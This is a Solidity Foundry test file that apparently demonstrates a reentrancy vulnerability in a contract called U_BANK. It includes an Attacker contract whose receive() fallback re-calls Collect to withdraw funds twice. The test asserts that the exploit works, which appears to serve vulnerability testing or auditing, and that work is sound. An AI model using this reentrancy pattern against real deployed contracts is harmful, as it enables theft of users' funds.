
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {U_BANK, Log} from "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {

    U_BANK public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        Log log = new Log();
        _contractUnderTest = new U_BANK(address(log));

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max / 2);

        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        vm.warp(block.timestamp + 1);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = U_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Put{value: val * 2}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        storedAttackVal = val;

        _victim.Collect(val);

        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.Collect(storedAttackVal);
            attackCallCount++;
        }
    }
}
